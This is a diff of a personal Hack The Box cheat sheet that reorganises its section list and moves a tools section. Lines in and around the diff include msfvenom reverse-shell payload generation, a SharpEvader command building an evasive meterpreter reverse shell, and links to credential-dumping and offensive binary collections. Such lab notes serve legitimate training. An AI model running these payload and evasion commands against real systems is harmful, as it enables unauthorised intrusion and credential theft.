@@ -6,10 +6,16 @@ Commands I usually use when doing HTB machines
 - [Enumeration](#enumeration)
 - [Bruteforce](#bruteforce)
 - [Linux Privilege Escalation](#linux-privilege-escalation)
-- [Tools and Utilities](#tools-and-utilities)
+- [Utilities](#tools-and-utilities)
 - [Reverse Shells](#reverse-shells)
+- [Services](#services)
+- [Tools](#tools)
 - [Miscellaneous](#miscellaneous)
-
+- [Tunneling](#tunneling)
+- [Web Exploitation](#web-exploitation)
+- [Windows Privilege Escalation](#windows-privilege-escalation)
+- [Wordlists](#wordlists)
+  
 ---
 
 ## Scan
@@ -517,7 +523,7 @@ redis-cli -h <IP> -a '$secret'
 KEYS *
 ```
 
-#### get specific key
+#### get a specific key
 ```bash
 LRANGE authlist 1 100
 ```
@@ -611,8 +617,25 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x25\x26
 searchsploit -m php/webapps/49876.py [module name]
 ```
 
-#### random tools
-- sucrack : https://github.com/hemp3l/sucrack
+### Compiled Binaries
+
+[https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
+
+[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
+
+### Exploitation Tools
+- gMSADumper
+
+[https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)
+- SharpEvader
+
+[https://github.com/Xyan1d3/SharpEvader](https://github.com/Xyan1d3/SharpEvader)
+
+```bash
+python3 sharpevader.py -p windows/x64/meterpreter/reverse_tcp -lh tun0 -lp 9001
+```
+
+- sucrack: https://github.com/hemp3l/sucrack
 
 ---
 
@@ -744,7 +767,7 @@ The script below looks for Win32 services on the host with unquoted service path
 Get-WmiObject -Class Win32_Service | Where-Object { $*.PathName -inotmatch “`”” -and $*.PathName -inotmatch “:\\\\Windows\\\\” }| Select Name,Pathname
 ```
 
-### PrivEsc
+### Windows Privilege Escalation
 - check for user privileges
 ```powershell
 whoami /priv
@@ -794,25 +817,6 @@ bloodhound
 - bloodhound python
 ```bash
 bloodhound-python -c all -u <username> -p <password> -d <domain> -dc <dc> -ns <ip> --disable-pooling -w1 --dns-timeout 30
-```
----
-
-## Compiled Binaries
-
-[https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
-
-[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
-
-## Tools
-#### gMSADumper
-
-[https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)
-#### SharpEvader
-
-[https://github.com/Xyan1d3/SharpEvader](https://github.com/Xyan1d3/SharpEvader)
-
-```bash
-python3 sharpevader.py -p windows/x64/meterpreter/reverse_tcp -lh tun0 -lp 9001
 ```
 
 ---
